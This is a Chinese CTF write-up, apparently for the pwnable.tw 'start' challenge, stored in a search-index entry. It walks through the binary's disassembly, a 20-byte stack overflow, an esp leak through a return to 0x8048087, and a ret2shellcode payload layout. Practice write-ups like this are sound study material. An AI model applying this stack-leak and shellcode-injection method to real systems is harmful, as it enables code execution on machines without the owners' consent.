    <content type="text"><![CDATA[使用ida查看程序，首先保存esp和_exit地址，随后将输出的字符串压栈： 123456789push esppush offset _exitxor eax, eax ; ebx, ecx, edxpush &apos;Let&apos;s start the CTF:&apos;mov ecx esp ; addrmov dl, 14h ; lenmov bl, 1 ; fdmov al, 4 ; syscall num, writeint 80h 随后执行输入函数： 1234xor ebx, ebx ; fdmov dl, 3Ch ; lenmov al, 3 ; syscall num, putint 80h 由于ecx在之前已经被赋值为esp，所以put函数仍是对同一个变量（输出的字符串）进行输入。使用gdb-peda的checksec查看，虽然显示NX: enable，但是通过vmmap执行，发现栈是可执行的。使用pattern create和pattern offset获取偏移量为20。因此构造的payload结构如下： 1'a' * 20 + [ret addr] + getshell 因为要获取栈的地址来达到ret2shellcode的目的，所以需要通过write泄漏栈地址。在程序运行的开始，执行了： 12push esppush offset _exit 在put函数后，执行： 12add esp, 14hret ;pop esp 使得字符串参数、_exit被移出栈、pop，栈顶从而变为之前储存的esp。因此在第一个put函数执行时，输入： 1'a' * 20 + 0x8048087 便可以打印出esp的地址。获取esp的地址后，将会继续再次执行put函数（此时ecx仍为字符串参数的地址），此时输入： 1'a' * 20 + [ret addr] + getshell 即可。需要注意shellcode长度以满足输入的条件（3Ch）。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>pwnable-tw</tag>
      </tags>
  </entry>
</search>
